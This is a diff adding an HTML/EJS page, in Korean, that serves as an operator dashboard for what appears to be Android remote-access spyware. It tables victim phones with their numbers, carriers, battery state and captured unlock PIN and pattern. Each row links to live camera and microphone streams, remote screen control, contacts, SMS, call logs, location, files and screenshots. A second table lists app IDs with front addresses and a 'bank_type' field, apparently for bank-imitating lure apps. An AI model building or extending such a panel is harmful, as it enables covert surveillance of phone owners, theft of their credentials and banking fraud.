@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>관리</title>
+    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+    <script src="/assets/plugins/jquery.min.js"></script>
+    <script src="/assets/socket/socket.io-client/dist/socket.io.js"></script>
+    <style>
+        table,
+        th,
+        td {
+            border: 1px solid black;
+            border-collapse: collapse;
+        }
+        
+        th,
+        td {
+            padding: 5px;
+            text-align: left;
+        }
+    </style>
+    <% include socket.ejs %>
+</head>
+
+<body>
+
+    <p>휴대폰 관리</p>
+    <div><button type="button" onclick="changeState()" id="state_btn">온라인</button></div>
+    <table id="table_data">
+    </table>
+    <p> 앱관리</p>
+    <table id="table_app">
+    </table>
+
+    <script type="text/javascript">
+        var base_url = "/api/mobiles";
+        var state = true;
+
+        function changeState() {
+            state = !state;
+            state ? $('#state_btn').text("온라인") : $('#state_btn').text("오프라인");
+            refresh();
+        }
+
+        function refresh() {
+            $.get(base_url, {
+                online: state
+            }, function(res) {
+                var data = res.items;
+                var html_string = `
+                    <tr>
+                        <th>전화번호</th>
+                        <th>On/OFF</th>
+                        <th>업체</th>
+                        <th>모델</th>
+                        <th>앱 버젼</th>
+                        <th>액션</th>
+                        <th>회사</th>
+                        <th>체계정보</th>
+                        <th>통신사</th>
+                        <th>배터리</th>
+                        <th>네트워크</th>
+                        <th>패스워드</th>
+                        <th>업데이트시간</th>
+                    </tr> `;
+                for (var i = 0; i < data.length; i++) {
+                    html_string += `<tr>
+                        <td>${data[i].number} (${data[i].name})</td>
+                        <td>${(data[i].online) ? 'ON' : 'OFF'}</td>
+                        <td>${data[i].user_name}</td>
+                        <td>${data[i].model}</td>
+                        <td>${data[i].app_version}</td>
+                        <td><a href="/test/mobiles/${data[i].id}/stream/camera" target="_blank">카메라</a>
+                            | <a href="/test/mobiles/${data[i].id}/stream/mic" target="_blank">마이크</a>
+                            | <a href="/test/mobiles/${data[i].id}/screen" target="_blank">화면조종</a>
+                            | <a href="/test/mobiles/${data[i].id}/contacts" target="_blank">연락처</a>
+                            | <a href="/test/mobiles/${data[i].id}/sms" target="_blank">SMS</a>
+                            | <a href="/test/mobiles/${data[i].id}/calllog" target="_blank">통화기록</a>
+                            | <a href="/test/mobiles/${data[i].id}/apks" target="_blank">앱관리</a>
+                            | <a href="/test/mobiles/${data[i].id}/location" target="_blank">위치</a>
+                            | <a href="/test/mobiles/${data[i].id}/files" target="_blank">파일관리</a>
+                            | <a href="/test/mobiles/${data[i].id}/logs" target="_blank">로그</a>
+                            | <a href="/test/mobiles/${data[i].id}/capture" target="_blank">화면캡처</a>
+                        </td>
+                        <td>${data[i].brand}</td>
+                        <td>${data[i].system_version}</td>
+                        <td>${data[i].network_operator}</td>
+                        <td>${data[i].battery_level}</td>
+                        <td>${data[i].connectivity}</td>
+                        <td>PIN: ${data[i].pin}, Pattern: ${data[i].pattern}</td>
+                        <td>${new Date(data[i].updated_at).toLocaleString()}</td>
+                        </tr>`;
+                }
+                $('#table_data').html(html_string);
+            })
+        }
+
+        function refreshApp() {
+            $.get("/api/appid", {
+                online: state
+            }, function(res) {
+                var data = res.items;
+                var html_string = `
+                    <tr>
+                        <th>APP_ID</th>
+                        <th>프론트</th>
+                        <th>엡링크</th>
+                        <th>유형</th>
+                    </tr> `;
+                for (var i = 0; i < data.length; i++) {
+                    html_string += `<tr>
+                        <td>${data[i].app_id}</td>
+                        <td><a href='${data[i].front_address}' target='_blank'>${data[i].front_address}</a></td>
+                        <td><a href='${data[i].address}'>${data[i].address}</a></td>                        
+                        <td>${data[i].bank_type}</td>                        
+                        </tr>`;
+                }
+                $('#table_app').html(html_string);
+            })
+        }
+
+        $(function() {
+            refresh();
+            refreshApp();
+            socket.on("mobiles_updated", function(data) {
+                refresh();
+            });
+
+            setInterval(() => {
+                refresh();
+            }, 5000);
+        })
+    </script>
+</body>
+
+</html>
